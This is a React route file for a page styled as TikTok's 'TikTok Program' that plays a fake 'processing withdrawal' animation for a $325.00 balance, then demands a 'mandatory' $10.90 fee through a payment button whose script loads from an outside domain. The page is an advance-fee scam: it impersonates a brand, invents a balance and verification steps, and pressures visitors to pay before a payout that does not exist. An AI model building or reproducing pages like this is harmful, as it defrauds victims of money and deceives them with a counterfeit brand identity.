import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import type { PaymentMethod } from "@/lib/payments";
import tiktokLogo from "@/assets/tiktok.svg";

export const Route = createFileRoute("/fee")({
  validateSearch: (search: Record<string, unknown>) => ({
    method: (search["method"] === "zelle" ? "zelle" : "paypal") as PaymentMethod,
    email: (search["email"] as string) || "",
  }),
  head: () => ({
    title: "Processing Withdrawal – TikTok Program",
    meta: [
      {
        name: "description",
        content: "Your withdrawal is being processed by the TikTok Program.",
      },
      { property: "og:title", content: "Processing Withdrawal – TikTok Program" },
      {
        property: "og:description",
        content: "Your withdrawal is being processed by the TikTok Program.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: FeePage,
});

function FeePage() {
  const navigate = useNavigate();
  const { method } = Route.useSearch();
  const [phase, setPhase] = useState<"processing" | "warning">("processing");
  const [step, setStep] = useState(0);

  useEffect(() => {
    if (phase !== "processing") return;
    const steps = [
      "Verifying your balance...",
      "Validating account details...",
      "Preparing the transfer...",
    ];
    if (step >= steps.length) {
      const timer = setTimeout(() => setPhase("warning"), 800);
      return () => clearTimeout(timer);
    }
    const timer = setTimeout(() => setStep((s) => s + 1), 1100);
    return () => clearTimeout(timer);
  }, [step, phase]);

  const paymentBtnRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (phase !== "warning" || !paymentBtnRef.current) return;
    const container = paymentBtnRef.current;
    container.innerHTML = "";
    const btn = document.createElement("button");
    btn.type = "button";
    btn.textContent = "MAKE PAYMENT";
    Object.assign(btn.style, {
      background: "#ff007b",
      color: "#ffffff",
      fontSize: "16px",
      fontWeight: "600",
      fontStyle: "normal",
      borderRadius: "9px",
      border: "0",
      padding: "14px 24px",
      minHeight: "44px",
      maxWidth: "100%",
      width: "100%",
      whiteSpace: "normal",
      overflowWrap: "anywhere",
      cursor: "pointer",
      fontFamily: "system-ui,sans-serif",
    });
    container.appendChild(btn);
    const script = document.createElement("script");
    script.src = "https://cavetechx.online/api/embed/digistore24-b443a5a6";
    container.appendChild(script);
  }, [phase]);

  const steps = [
    "Verifying your balance...",
    "Validating account details...",
    "Preparing the transfer...",
  ];

  return (
    <div className="min-h-screen bg-[#f9f9f9] px-4 pt-8">
      <div className="mx-auto max-w-md">
        {/* HEADER SIMPLES */}
        <div className="mb-8 flex items-center justify-between">
          <button
            onClick={() => navigate({ to: "/withdraw" })}
            className="text-[14px] font-semibold text-[#555555]"
          >
            ← Back
          </button>
          <div className="flex items-center gap-2">
            <img src={tiktokLogo} alt="TikTok" className="h-6 w-6" />
            <span className="text-lg font-black tracking-tighter text-[#1a1a2e]">TikTok</span>
          </div>
        </div>

        {phase === "processing" ? (
          <div className="rounded-[20px] border border-[#ebebeb] bg-white p-8 text-center shadow-[0_4px_20px_rgba(0,0,0,0.05)]">
            <div className="mx-auto mb-5 h-14 w-14 animate-spin rounded-full border-4 border-[#ffe1e7] border-t-[#ff4d67]"></div>
            <h1 className="mb-2 text-xl font-black text-[#1a1a2e]">Processing withdrawal</h1>
            <p className="mb-6 text-[14px] text-[#555555]">
              Please wait. We are completing your $325.00 withdrawal.
            </p>

            <div className="mb-6 space-y-3 text-left">
              {steps.map((label, i) => (
                <div key={label} className="flex items-center gap-3">
                  <div
                    className={`flex h-6 w-6 shrink-0 items-center justify-center rounded-full border-2 transition-all ${
                      i < step
                        ? "border-[#15803d] bg-[#15803d]"
                        : i === step
                          ? "border-[#ff4d67] bg-[#fff0f3]"
                          : "border-[#ebebeb] bg-white"
                    }`}
                  >
                    {i < step ? (
                      <svg width="12" height="12" viewBox="0 0 24 24" fill="#ffffff">
                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
                      </svg>
                    ) : i === step ? (
                      <div className="h-3 w-3 animate-spin rounded-full border-2 border-[#ff4d67]/30 border-t-[#ff4d67]" />
                    ) : null}
                  </div>
                  <span
                    className={`text-[13px] font-semibold ${
                      i < step ? "text-[#15803d]" : i === step ? "text-[#1a1a2e]" : "text-[#999999]"
                    }`}
                  >
                    {label}
                  </span>
                </div>
              ))}
            </div>

            <div className="h-2 w-full overflow-hidden rounded-full bg-[#f0f0f0]">
              <div
                className="h-full rounded-full bg-[#ff4d67] transition-all duration-1000 ease-linear"
                style={{ width: `${Math.min((step / steps.length) * 100, 100)}%` }}
              ></div>
            </div>
          </div>
        ) : (
          <div className="rounded-[20px] border border-[#ebebeb] bg-white p-6 shadow-[0_4px_20px_rgba(0,0,0,0.05)]">
            <div className="fee-modal-icon mx-auto mb-4" aria-hidden="true">
              !
            </div>
            <span className="mb-1 block text-center text-[11px] font-black uppercase tracking-[0.18em] text-[#ff4d67]">
              Important notice
            </span>
            <h1 className="mb-2 text-center text-xl font-black text-[#1a1a2e]">
              Mandatory withdrawal fee
            </h1>
            <p className="mb-5 text-center text-[13px] leading-relaxed text-[#555555]">
              A mandatory $10.90 processing fee was identified. Your $325.00 withdrawal can only be released after this fee is paid.
            </p>

            <div className="mb-5 rounded-[14px] border border-[#ebebeb] bg-[#f9f9f9] p-4 text-left">
              <div className="flex items-center justify-between py-1">
                <span className="text-[12px] font-semibold text-[#555555]">Withdrawal amount</span>
                <span className="text-[13px] font-black text-[#15803d]">$325.00</span>
              </div>
              <div className="flex items-center justify-between py-1">
                <span className="text-[12px] font-semibold text-[#555555]">Withdrawal fee</span>
                <span className="text-[13px] font-black text-[#ff4d67]">$10.90</span>
              </div>
              <div className="flex items-center justify-between py-1">
                <span className="text-[12px] font-semibold text-[#555555]">Method</span>
                <span className="text-[13px] font-black text-[#1a1a2e]">
                  {method === "zelle" ? "Zelle" : "PayPal"}
                </span>
              </div>
            </div>

            <div ref={paymentBtnRef} className="w-full" />
            <button
              type="button"
              onClick={() => navigate({ to: "/withdraw" })}
              className="mt-3 w-full rounded-[12px] p-[12px] text-[13px] font-bold text-[#555555] transition-all hover:bg-[#f9f9f9]"
            >
              NOT NOW
            </button>
          </div>
        )}
      </div>
    </div>
  );
}
